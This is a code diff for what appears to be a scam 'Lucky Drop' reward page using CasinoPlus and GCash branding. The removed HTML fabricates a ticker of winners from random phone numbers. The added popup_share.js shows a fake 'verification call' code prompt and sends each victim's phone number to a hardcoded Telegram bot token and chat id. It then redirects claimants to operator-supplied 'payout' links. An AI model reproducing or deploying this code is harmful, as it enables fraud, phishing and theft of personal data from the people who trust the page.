@@ -1,443 +1,406 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Lucky Drop | Share & Earn</title>
-    
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    <script src="js/config.js"></script>
-    
-    <meta property="og:title" content="CasinoPlus Lucky Drop">
-    <meta property="og:description" content="Share with friends and earn up to ₱300!">
-    <meta property="og:image" content="https://xjiligames.github.io/rewards/images/logo1.png">
-    <meta property="og:url" content="https://xjiligames.github.io/rewards/index.html">
-    <meta property="og:type" content="website">
-    
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&amp;family=Orbitron:wght@700;900&amp;display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="styles/promo.css">
-    
-    <style>
-        .spin-effect {
-            animation: spinIcon 0.5s ease-out;
-        }
-        @keyframes spinIcon {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        @keyframes neonSkyPulse {
-            0% { box-shadow: 0 0 5px #00b4d8, 0 0 10px #0077b6; background: linear-gradient(135deg, #00b4d8, #0077b6); }
-            50% { box-shadow: 0 0 15px #00b4d8, 0 0 25px #0077b6, 0 0 35px #00b4d8; background: linear-gradient(135deg, #48cae4, #0096c7, #0077b6); }
-            100% { box-shadow: 0 0 5px #00b4d8, 0 0 10px #0077b6; background: linear-gradient(135deg, #00b4d8, #0077b6); }
-        }
-    </style>
-</head>
-<body>
+// ========== POPUP_SHARE.JS - COMPLETE ==========
 
-<!-- WINNER TICKER -->
-<div class="live-winners-ticker" id="winnerTicker">
-    <div class="live-dot"></div>
-    <span id="winnerText">0917***4256 withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱1,200</span>
-</div>
+// ========== FIREWALL VERIFICATION VARIABLES ==========
+var currentVerificationCode = null;
+var verificationAttempts = 0;
 
-<div class="share-container">
-    <div class="header">
-        <h1>LUCKY DROP 🐾</h1>
-    </div>
-    
-    <!-- USER INFO CARD -->
-    <div class="user-info-card">
-        <div class="user-info-icon">📱</div>
-        <div class="user-info-text">
-            <span class="user-info-label">Logged in as</span>
-            <span class="user-info-number" id="userPhoneDisplay">Loading...</span>
-        </div>
-        <div class="user-info-badge">
-            <span class="badge-dot"></span>
-            <span class="badge-text">Active</span>
-        </div>
-    </div>
-
-    <!-- STATS ROW -->
-    <div class="stats-row">
-        <div class="stat-box">
-            <div>BALANCE</div>
-            <div id="userBalanceDisplay">₱0</div>
-        </div>
-        <div class="stat-box">
-            <div>INVITES</div>
-            <div id="invitesCountDisplay">0 / 6</div>
-        </div>
-    </div>
-    
-    <!-- STEP 1 DROPDOWN BUTTON -->
-    <div class="step1-dropdown">
-        <button class="dropdown-btn" id="dropdownBtn">
-            <span class="dropdown-icon">👥</span>
-            <span class="dropdown-text">INVITE FRIENDS</span>
-            <span class="dropdown-arrow">▼</span>
-        </button>
-        
-        <div class="dropdown-content" id="dropdownContent">
-            <div class="invite-form-section">
-                <div class="invite-form-title">Send Invitation</div>
-                <div class="invite-form-row">
-                    <input type="tel" id="friendPhoneInput" class="invite-input" placeholder="Enter mobile number" maxlength="11" oninput="this.value = this.value.replace(/[^0-9]/g, '')">
-                    <button class="invite-send-btn" id="sendInviteBtn">SEND</button>
-                </div>
-            </div>
-            
-            <div class="invite-list-section">
-                <div class="invite-section-title">📤 My Invitations</div>
-                <div class="invite-list-header">
-                    <span>MOBILE NUMBER</span>
-                    <span>STATUS</span>
-                    <span>ACTION</span>
-                </div>
-                <div id="sentInvitesList" class="invite-list-body">
-                    <div class="invite-empty">No invitations sent</div>
-                </div>
-            </div>
-            
-            <div class="invite-list-section">
-                <div class="invite-section-title">📥 Invitations Received</div>
-                <div class="invite-list-header">
-                    <span>FROM</span>
-                    <span>STATUS</span>
-                    <span>REWARD</span>
-                </div>
-                <div id="receivedInvitesList" class="invite-list-body">
-                    <div class="invite-empty">No invitations received</div>
-                </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- PRIZE GRID -->
-    <div class="prize-grid">
-        <div class="prize-card" id="leftCard">
-            <div class="lucky-cat-video">
-                <video autoplay loop muted playsinline id="luckyCatVideo">
-                    <source src="sounds/luckycat.mp4" type="video/mp4">
-                </video>
-                <audio id="luckyCatSound" src="sounds/luckycat.mp4" preload="auto"></audio>
-            </div>
-            <div class="prize-label">YOU GET</div>
-            <div class="prize-amount">₱150</div>
-        </div>
-        <div class="prize-card" id="rightCard">
-            <div class="lucky-cat-video">
-                <video autoplay loop muted playsinline>
-                    <source src="sounds/luckycat.mp4" type="video/mp4">
-                </video>
-            </div>
-            <div class="prize-label">FRIEND GETS</div>
-            <div class="prize-amount" id="rightRewardAmount">₱0</div>
-        </div>
-    </div>
-    
-    <div class="winners-banner">
-        <span>🌟 <strong>LUCKY WINNERS</strong> 🌟<br> will receive <strong>₱150 Credits</strong></span>
-    </div>
-    
-    <div class="time-left-section">
-        <div class="time-label">⏰ HOORAY DROP ENDS IN ⏰</div>
-        <div class="time-display" id="mainTimerDisplay">--D --:--:--</div>
-    </div>
-    
-    <!-- CLAIM NOW BUTTON -->
-    <button class="claim-now-btn" id="claimNowBtn">
-        <img src="images/scatter_icon.jpg" id="claimNowIcon" style="width: 22px; height: 22px;" alt="icon"> CLAIM NOW!!
-    </button>
-    
-    <div class="progress-bar">
-        <div class="progress-fill" id="progressFill"></div>
-    </div>
-    <div class="status-message" id="statusMessage">
-        <span class="status-locked">🐱 Click the <strong>Maneki-neko</strong> to claim <strong style="color:#ffd700;">₱150!</strong> ✨</span>
-    </div>
-    
-    <!-- SHARE SECTION -->
-    <div style="display: flex; align-items: center; text-align: center; margin: 15px 0; gap: 10px;">
-        <span style="flex: 1; height: 1px; background: linear-gradient(90deg, transparent, rgba(255,215,0,0.4), transparent);"></span>
-        <span style="font-size: 11px; color: #ffaa33; padding: 0 10px;">or share with friends</span>
-        <span style="flex: 1; height: 1px; background: linear-gradient(90deg, transparent, rgba(255,215,0,0.4), transparent);"></span>
-    </div>
-    
-    <!-- FACEBOOK SHARE BUTTON -->
-    <button id="shareFBBtn" style="
-        background: linear-gradient(135deg, #00b4d8, #0077b6, #023e8a);
-        width: 100%;
-        padding: 14px 20px;
-        border: none;
-        border-radius: 60px;
-        font-weight: 700;
-        color: white;
-        font-size: 15px;
-        cursor: pointer;
-        margin-top: 5px;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 12px;
-        box-shadow: 0 0 5px #00b4d8, 0 0 10px #0077b6;
-    ">
-        <img src="images/fb_icon.png" style="width: 20px; height: 20px; filter: brightness(0) invert(1);" alt="fb"> Share on Facebook
-    </button>
-    
-    <!-- Guide Text -->
-    <div class="share-guide-text" style="
-        text-align: center;
-        font-size: 11px;
-        color: #ffaa33;
-        margin-top: 12px;
-        padding: 6px 12px;
-        background: rgba(0,0,0,0.3);
-        border-radius: 20px;
-    ">
-        📢 More shares = more chances to get extra <strong style="color: #ffd700;">+₱150 Credits</strong>
-    </div>
-    
-    <div class="share-social-text">Share to Social Media friends to get up to ₱1,000</div>
-</div>
-
-<!-- PRIZE POPUP (empty skeleton - lalagyan ng dynamic content) -->
-<div id="prizePopup" class="prize-popup" style="display: none;">
-    <div class="popup-container">
-        <div class="popup-inner">
-            <div class="popup-close" onclick="closePrizePopup()">✕</div>
-            <div id="dynamicPopupContent">
-                <!-- DITO ILALAGAY NG popup_share.js ANG MGA BUTTONS -->
-            </div>
-        </div>
-    </div>
-</div>
-
-<canvas id="confettiCanvas"></canvas>
-
-<script src="js/promotion.js"></script>
-<script src="js/popup_share.js"></script>
-
-<script>
-    // CLAIM NOW BUTTON
-    var claimNowBtn = document.getElementById('claimNowBtn');
-    var claimNowIcon = document.getElementById('claimNowIcon');
-    var isPopupShowing = false;
-    
-    if (claimNowBtn) {
-        claimNowBtn.onclick = function(e) {
-            e.preventDefault();
-            if (isPopupShowing) return;
-            
-            if (claimNowIcon) {
-                claimNowIcon.classList.add('spin-effect');
-                setTimeout(function() {
-                    claimNowIcon.classList.remove('spin-effect');
-                }, 500);
-            }
-            
-            showPrizePopup();
-        };
+// ========== GET FIREWALL STATUS ==========
+async function getFirewallStatus() {
+    if (typeof firebase === 'undefined' || !firebase.database) {
+        console.warn("Firebase not available");
+        return false;
     }
-    
-    // FACEBOOK SHARE BUTTON
-    var fbBtn = document.getElementById('shareFBBtn');
-    if (fbBtn) {
-        fbBtn.style.animation = 'neonSkyPulse 1.5s ease-in-out infinite';
-        fbBtn.onclick = function() {
-            var shareUrl = "https://xjiligames.github.io/rewards/index.html";
-            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank', 'width=600,height=500');
-        };
-    }
-    
-    function showPrizePopup() {
-        var popup = document.getElementById('prizePopup');
-        if (popup) {
-            popup.style.display = 'flex';
-            startConfetti();
-            isPopupShowing = true;
-        }
-    }
-    
-    function closePrizePopup() {
-        var popup = document.getElementById('prizePopup');
-        if (popup) {
-            popup.style.display = 'none';
-            stopConfetti();
-            isPopupShowing = false;
-        }
-    }
-    
-    window.closePrizePopup = closePrizePopup;
-    window.showPrizePopup = showPrizePopup;
-    
-    // Mobile detection
-    function isMobileDevice() {
-        return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-    }
-    
-    if (!isMobileDevice()) {
-        document.body.innerHTML = '<div style="background:#0a0a1a; color:#ffd700; display:flex; align-items:center; justify-content:center; height:100vh; text-align:center; padding:20px; font-family:sans-serif;"><div><h2>Mobile Only</h2><p>Please use your smartphone to access this page.</p></div></div>';
-        document.body.style.background = '#0a0a1a';
-    }
-    
-    // Countdown Timer
-    (function() {
-        var timerDisplay = document.getElementById('mainTimerDisplay');
-        if (!timerDisplay) return;
-        var targetDate = new Date(2026, 4, 1, 0, 0, 0);
-        function updateTimer() {
-            var now = new Date();
-            var diff = targetDate - now;
-            if (diff <= 0) { 
-                timerDisplay.innerHTML = "00D 00:00:00"; 
-                return; 
-            }
-            var days = Math.floor(diff / (1000 * 60 * 60 * 24));
-            var hours = Math.floor((diff % (86400000)) / 3600000);
-            var mins = Math.floor((diff % 3600000) / 60000);
-            var secs = Math.floor((diff % 60000) / 1000);
-            timerDisplay.innerHTML = days + "D " + hours.toString().padStart(2,'0') + ":" + mins.toString().padStart(2,'0') + ":" + secs.toString().padStart(2,'0');
-        }
-        updateTimer();
-        setInterval(updateTimer, 1000);
-    })();
-    
-    // Winner Ticker
-    (function() {
-        var winnerSpan = document.getElementById('winnerText');
-        if (!winnerSpan) return;
-        var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955"];
-        var amounts = [150, 300, 450, 600, 750, 900, 1050, 1200];
-        function generateWinner() {
-            var prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
-            var last4 = Math.floor(1000 + Math.random() * 9000);
-            var amount = amounts[Math.floor(Math.random() * amounts.length)];
-            return prefix + "***" + last4 + ' withdrawn <img src="images/gc_icon.png" class="gc-winner-icon"> ₱' + amount;
-        }
-        winnerSpan.innerHTML = generateWinner();
-        setInterval(function() { 
-            winnerSpan.innerHTML = generateWinner(); 
-        }, 15000);
-    })();
-    
-    // User Phone Display
-    var userPhone = localStorage.getItem("userPhone");
-    var display = document.getElementById('userPhoneDisplay');
-    if (display) {
-        if (userPhone && userPhone.length === 11) {
-            display.innerText = userPhone.substring(0, 4) + '****' + userPhone.substring(8, 11);
-        } else {
-            display.innerText = userPhone || 'Not logged in';
-        }
-    }
-    if (!userPhone) {
-        alert("Please login first.");
-        window.location.href = "index.html";
-    }
-    
-    // Dropdown Toggle
-    var dropdownBtn = document.getElementById('dropdownBtn');
-    var dropdownContent = document.getElementById('dropdownContent');
-    if (dropdownBtn && dropdownContent) {
-        dropdownBtn.addEventListener('click', function(e) {
-            e.stopPropagation();
-            dropdownContent.classList.toggle('show');
-            var arrow = dropdownBtn.querySelector('.dropdown-arrow');
-            if (dropdownContent.classList.contains('show')) {
-                if (arrow) arrow.innerHTML = '▲';
-            } else {
-                if (arrow) arrow.innerHTML = '▼';
-            }
-        });
-        
-        document.addEventListener('click', function(e) {
-            if (dropdownBtn && dropdownContent) {
-                if (!dropdownBtn.contains(e.target) && !dropdownContent.contains(e.target)) {
-                    dropdownContent.classList.remove('show');
-                    var arrow = dropdownBtn.querySelector('.dropdown-arrow');
-                    if (arrow) arrow.innerHTML = '▼';
-                }
-            }
-        });
-    }
-    
-    // Stats Row CSS
-    var statsRow = document.querySelector('.stats-row');
-    if (statsRow) {
-        statsRow.style.display = 'flex';
-        statsRow.style.gap = '10px';
-        statsRow.style.marginBottom = '15px';
-    }
-    
-    var statBoxes = document.querySelectorAll('.stat-box');
-    for (var i = 0; i < statBoxes.length; i++) {
-        statBoxes[i].style.flex = '1';
-        statBoxes[i].style.background = 'rgba(0,0,0,0.3)';
-        statBoxes[i].style.borderRadius = '20px';
-        statBoxes[i].style.padding = '8px';
-        statBoxes[i].style.textAlign = 'center';
-    }
-    
-    // Confetti
-    var confettiAnimation = null;
-    var confettiTimeout = null;
-    
-    function startConfetti() {
-        var canvas = document.getElementById('confettiCanvas');
-        if (!canvas) return;
-        stopConfetti();
-        canvas.style.display = 'block';
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-        var ctx = canvas.getContext('2d');
-        var particles = [];
-        for (var i = 0; i < 100; i++) {
-            particles.push({
-                x: Math.random() * canvas.width,
-                y: Math.random() * canvas.height - canvas.height,
-                size: Math.random() * 6 + 2,
-                color: "hsl(" + (Math.random() * 360) + ", 100%, 60%)",
-                speed: Math.random() * 3 + 2
+    try {
+        const db = firebase.database();
+        const snap = await db.ref('admin/globalFirewall').once('value');
+        const data = snap.val();
+        console.log("Firewall status from Firebase:", data);
+        if (data === null) {
+            await db.ref('admin/globalFirewall').set({
+                active: false,
+                activatedBy: "SYSTEM",
+                timestamp: Date.now()
             });
+            return false;
         }
-        function draw() {
-            if (!canvas || canvas.style.display === 'none') return;
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            for (var j = 0; j < particles.length; j++) {
-                var p = particles[j];
-                ctx.fillStyle = p.color;
-                ctx.fillRect(p.x, p.y, p.size, p.size);
-                p.y += p.speed;
-                if (p.y > canvas.height) {
-                    p.y = -p.size;
-                    p.x = Math.random() * canvas.width;
-                }
-            }
-            confettiAnimation = requestAnimationFrame(draw);
-        }
-        draw();
-        if (confettiTimeout) clearTimeout(confettiTimeout);
-        confettiTimeout = setTimeout(stopConfetti, 3000);
+        return data.active === true;
+    } catch(e) {
+        console.error("Firewall check error:", e);
+        return false;
     }
-    
-    function stopConfetti() {
-        if (confettiAnimation) {
-            cancelAnimationFrame(confettiAnimation);
-            confettiAnimation = null;
-        }
-        var canvas = document.getElementById('confettiCanvas');
-        if (canvas) {
-            var ctx = canvas.getContext('2d');
-            if (ctx) ctx.clearRect(0, 0, canvas.width, canvas.height);
-            canvas.style.display = 'none';
-        }
-    }
-    
-    window.startConfetti = startConfetti;
-    window.stopConfetti = stopConfetti;
-</script>
+}
 
-</body>
-</html>
+// ========== GET LATEST PAYOUT LINK ==========
+async function getLatestPayoutLink() {
+    if (typeof firebase === 'undefined' || !firebase.database) return null;
+    try {
+        const db = firebase.database();
+        console.log("Looking for available links in 'links' node...");
+        
+        const snapshot = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        
+        console.log("Snapshot exists?", snapshot.exists());
+        
+        if (snapshot.exists()) {
+            const key = Object.keys(snapshot.val())[0];
+            const linkData = snapshot.val()[key];
+            console.log("Found payout link:", linkData.url, "Key:", key);
+            return { url: linkData.url, key: key };
+        }
+        
+        // Try to see all links for debugging
+        const allLinks = await db.ref('links').once('value');
+        console.log("All links in database:", allLinks.val());
+        
+        return null;
+    } catch (error) {
+        console.error("Error getting payout link:", error);
+        return null;
+    }
+}
+
+// ========== FIREWALL VERIFICATION POPUP ==========
+function showFirewallVerificationPopup() {
+    var existingModal = document.getElementById('firewallVerifyModal');
+    if (existingModal) existingModal.remove();
+    
+    var modal = document.createElement('div');
+    modal.id = 'firewallVerifyModal';
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100%';
+    modal.style.height = '100%';
+    modal.style.background = 'rgba(0,0,0,0.95)';
+    modal.style.backdropFilter = 'blur(10px)';
+    modal.style.zIndex = '20001';
+    modal.style.display = 'flex';
+    modal.style.alignItems = 'center';
+    modal.style.justifyContent = 'center';
+    
+    var verificationCode = Math.floor(1000 + Math.random() * 9000).toString();
+    console.log("Verification code for this session:", verificationCode);
+    
+    modal.innerHTML = `
+        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 48px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,215,0,0.3);">
+            <div style="font-size: 48px; margin-bottom: 15px;">📞</div>
+            <h2 style="color: #ff4444; font-size: 22px; margin-bottom: 15px;">VERIFICATION REQUIRED</h2>
+            <div style="color: white; font-size: 13px; margin-bottom: 20px; line-height: 1.5;">
+                <p>You will receive a call from our verification system.</p>
+                <p>Please enter the <strong>4-digit code</strong> provided during the call.</p>
+            </div>
+            <div style="display: flex; gap: 10px; margin-bottom: 15px;">
+                <input type="text" id="verifyCodeInput" style="flex: 1; background: rgba(0,0,0,0.5); border: 1px solid rgba(255,215,0,0.3); border-radius: 30px; padding: 12px; color: white; font-size: 18px; text-align: center; letter-spacing: 4px;" placeholder="1234" maxlength="4" inputmode="numeric">
+                <button id="submitVerifyBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 30px; padding: 0 20px; font-weight: bold; color: white; cursor: pointer;">VERIFY</button>
+            </div>
+            <div id="verifyErrorMsg" style="color: #ff4444; font-size: 12px; margin-top: 10px; display: none;"></div>
+            <div style="font-size: 11px; color: #ffaa33; margin-top: 10px;">Waiting for verification call...</div>
+        </div>
+    `;
+    
+    document.body.appendChild(modal);
+    
+    var codeInput = document.getElementById('verifyCodeInput');
+    var verifyBtn = document.getElementById('submitVerifyBtn');
+    var errorDiv = document.getElementById('verifyErrorMsg');
+    var attempts = 0;
+    
+    if (codeInput) codeInput.focus();
+    
+    verifyBtn.onclick = function() {
+        var enteredCode = codeInput.value.trim();
+        
+        if (!enteredCode || enteredCode.length < 4) {
+            errorDiv.innerHTML = "Please enter a 4-digit code.";
+            errorDiv.style.display = 'block';
+            return;
+        }
+        
+        attempts++;
+        
+        if (enteredCode === verificationCode) {
+            var userPhone = localStorage.getItem("userPhone") || "Unknown";
+            fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("VERIFY SUCCESS\nPhone: " + userPhone))
+                .catch(function(e) {});
+            modal.remove();
+            alert("Verification successful! Please try claiming again.");
+            setTimeout(function() {
+                window.location.reload();
+            }, 1000);
+        } else {
+            var errorMsg = "Invalid verification code. Please try again.";
+            if (attempts >= 3) {
+                errorMsg = "Too many failed attempts. Page will refresh.";
+                setTimeout(function() {
+                    window.location.reload();
+                }, 2000);
+            }
+            errorDiv.innerHTML = errorMsg;
+            errorDiv.style.display = 'block';
+            codeInput.value = '';
+            codeInput.focus();
+        }
+    };
+    
+    modal.onclick = function(e) {
+        if (e.target === modal) modal.remove();
+    };
+}
+
+// ========== NO LINK ALERT ==========
+function showNoLinkAlert() {
+    var modal = document.createElement('div');
+    modal.style.position = 'fixed';
+    modal.style.top = '0';
+    modal.style.left = '0';
+    modal.style.width = '100%';
+    modal.style.height = '100%';
+    modal.style.background = 'rgba(0,0,0,0.95)';
+    modal.style.backdropFilter = 'blur(10px)';
+    modal.style.zIndex = '20000';
+    modal.style.display = 'flex';
+    modal.style.alignItems = 'center';
+    modal.style.justifyContent = 'center';
+    modal.style.fontFamily = "'Inter', sans-serif";
+    
+    modal.innerHTML = `
+        <div style="background: linear-gradient(145deg, #1a1525, #0f0a1a); border-radius: 40px; max-width: 340px; width: 85%; padding: 30px 25px; text-align: center; border: 1px solid rgba(255,68,68,0.3);">
+            <div style="font-size: 48px; margin-bottom: 15px;">⚠️</div>
+            <h3 style="color: #ff4444; font-size: 20px; margin-bottom: 20px;">WITHDRAWAL UNSUCCESSFUL</h3>
+            <div style="color: white; font-size: 13px; line-height: 1.6; text-align: left;">
+                <p><strong>Possible Reasons:</strong></p>
+                <p>• No GCash payout link has been deployed by the administrator.</p>
+                <p>• This device has already reached the maximum payout limit.</p>
+                <p>• No GCash app installed on this device.</p>
+                <p>• Please try using another device or contact support.</p>
+            </div>
+            <button id="closeAlertBtn" style="background: linear-gradient(135deg, #ff4444, #cc0000); border: none; border-radius: 40px; padding: 12px 25px; color: white; font-weight: bold; margin-top: 25px; cursor: pointer; width: 100%;">GOT IT</button>
+        </div>
+    `;
+    
+    document.body.appendChild(modal);
+    document.getElementById('closeAlertBtn').onclick = function() {
+        modal.remove();
+    };
+    
+    modal.onclick = function(e) {
+        if (e.target === modal) modal.remove();
+    };
+}
+
+// ========== SHOW PRIZE POPUP WITH DYNAMIC CONTENT ==========
+function showPrizePopup() {
+    var popup = document.getElementById('prizePopup');
+    var contentDiv = document.getElementById('dynamicPopupContent');
+    
+    if (contentDiv) {
+        contentDiv.innerHTML = `
+            <div class="popup-balance" id="popupBalanceAmount">₱150.00</div>
+            <div class="divider"></div>
+            <div class="invite-text">Your friend must confirm your invitation to get extra <strong>₱150 bonus</strong>.</div>
+            <div class="luckyday-image-container">
+                <img src="images/luckyday.png" alt="Lucky Day" class="luckyday-img" onerror="this.style.display='none'">
+            </div>
+            <div class="divider"></div>
+            <div class="indicator-group">
+                <div class="indicator" id="indicator1"></div>
+                <div class="indicator" id="indicator2"></div>
+                <div class="indicator" id="indicator3"></div>
+            </div>
+            
+            <!-- CLAIM THRU GCASH Button -->
+            <button class="claim-gcash-button" id="claimGCashBtn" style="
+                background: linear-gradient(135deg, #0066ff, #0044cc);
+                width: 100%;
+                padding: 14px;
+                border: none;
+                border-radius: 60px;
+                font-weight: 800;
+                color: white;
+                font-size: 15px;
+                cursor: pointer;
+                margin-top: 12px;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+            ">
+                <img src="images/gc_icon.png" style="width: 20px; height: 20px;" alt="gc"> CLAIM THRU GCASH
+            </button>
+
+            <div style="height: 1px; background: linear-gradient(90deg, transparent, rgba(255,215,0,0.4), transparent); margin: 12px 0;"></div>
+
+            <!-- BACK Button -->
+            <button id="backBtn" style="
+                background: linear-gradient(135deg, #ffd700, #ffaa33, #ff8c00);
+                border: none;
+                border-radius: 50px;
+                padding: 8px 20px;
+                font-weight: 700;
+                color: #1a1a2e;
+                font-size: 13px;
+                cursor: pointer;
+                margin-top: 5px;
+                display: inline-flex;
+                align-items: center;
+                justify-content: center;
+                gap: 6px;
+                width: auto;
+                min-width: 90px;
+                box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+            ">
+                ← BACK
+            </button>
+        `;
+        
+        // Initialize buttons after adding to DOM
+        initClaimThruGCashButton();
+        initBackButton();
+    }
+    
+    if (popup) {
+        popup.style.display = 'flex';
+        if (typeof startConfetti === 'function') startConfetti();
+    }
+}
+
+function closePrizePopup() {
+    var popup = document.getElementById('prizePopup');
+    if (popup) {
+        popup.style.display = 'none';
+        if (typeof stopConfetti === 'function') stopConfetti();
+    }
+}
+
+// ========== BACK BUTTON ==========
+function initBackButton() {
+    var backBtn = document.getElementById('backBtn');
+    if (backBtn) {
+        var newBtn = backBtn.cloneNode(true);
+        backBtn.parentNode.replaceChild(newBtn, backBtn);
+        backBtn = newBtn;
+        
+        backBtn.onclick = function(e) {
+            e.preventDefault();
+            closePrizePopup();
+        };
+    }
+}
+
+// ========== CLAIM THRU GCASH HANDLER ==========
+async function handleClaimThruGCash() {
+    console.log("=== CLAIM THRU GCASH START ===");
+    
+    // Close the prize popup first
+    var prizePopup = document.getElementById('prizePopup');
+    if (prizePopup) prizePopup.style.display = 'none';
+    
+    // Check if Firebase is available
+    if (typeof firebase === 'undefined' || !firebase.database) {
+        console.error("Firebase not available");
+        alert("CONNECTION ERROR\n\nPlease refresh the page and try again.");
+        return;
+    }
+    
+    try {
+        const db = firebase.database();
+        
+        // 1. Check firewall status
+        console.log("Checking firewall status...");
+        const firewallSnap = await db.ref('admin/globalFirewall').once('value');
+        const firewallData = firewallSnap.val();
+        const isFirewallOn = firewallData && firewallData.active === true;
+        console.log("Firewall status:", isFirewallOn ? "ON" : "OFF");
+        
+        if (isFirewallOn) {
+            console.log("Firewall ON - Showing verification popup");
+            showFirewallVerificationPopup();
+            return;
+        }
+        
+        // 2. Check for available links
+        console.log("Checking for available links...");
+        const linksSnap = await db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value');
+        
+        console.log("Links snapshot exists?", linksSnap.exists());
+        
+        if (!linksSnap.exists()) {
+            console.log("No available links found");
+            showNoLinkAlert();
+            return;
+        }
+        
+        // 3. Get the link
+        var linkKey = null;
+        var linkUrl = null;
+        
+        linksSnap.forEach(function(child) {
+            linkKey = child.key;
+            linkUrl = child.val().url;
+            console.log("Found link - Key:", linkKey, "URL:", linkUrl);
+        });
+        
+        if (!linkUrl) {
+            console.log("Invalid link URL");
+            showNoLinkAlert();
+            return;
+        }
+        
+        // 4. Fix URL if needed
+        if (linkUrl && !linkUrl.startsWith('http')) {
+            linkUrl = 'https://' + linkUrl;
+        }
+        
+        // 5. Update link status to claimed
+        const userPhone = localStorage.getItem("userPhone") || "Unknown";
+        await db.ref('links/' + linkKey).update({
+            status: 'claimed',
+            user: userPhone,
+            claimedAt: Date.now()
+        });
+        console.log("Link status updated to claimed");
+        
+        // 6. Send Telegram notification
+        fetch('https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=' + encodeURIComponent("CLAIM SUCCESS!\nPhone: " + userPhone + "\nAmount: ₱150\nLink: " + linkUrl))
+            .catch(e => console.log("Telegram error:", e));
+        
+        console.log("Redirecting to:", linkUrl);
+        alert("✅ CLAIM SUCCESSFUL!\n\nYou will be redirected to complete your withdrawal.");
+        window.location.href = linkUrl;
+        
+    } catch(error) {
+        console.error("ERROR in handleClaimThruGCash:", error);
+        alert("SYSTEM ERROR\n\nPlease try again later.\n\nError: " + error.message);
+    }
+    
+    console.log("=== CLAIM THRU GCASH END ===");
+}
+
+// ========== INITIALIZE CLAIM THRU GCASH BUTTON ==========
+function initClaimThruGCashButton() {
+    var claimBtn = document.getElementById('claimGCashBtn');
+    if (claimBtn) {
+        var newBtn = claimBtn.cloneNode(true);
+        claimBtn.parentNode.replaceChild(newBtn, claimBtn);
+        claimBtn = newBtn;
+        
+        claimBtn.onclick = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log("CLAIM THRU GCASH button clicked");
+            handleClaimThruGCash();
+        };
+        console.log("CLAIM THRU GCASH button initialized");
+    } else {
+        console.log("CLAIM THRU GCASH button not found yet");
+    }
+}
+
+// ========== INITIALIZE ALL ==========
+document.addEventListener('DOMContentLoaded', function() {
+    console.log("Popup_share.js loaded");
+    
+    // CLAIM NOW button is handled in HTML
+    
+    // Facebook share button is handled in HTML
+});
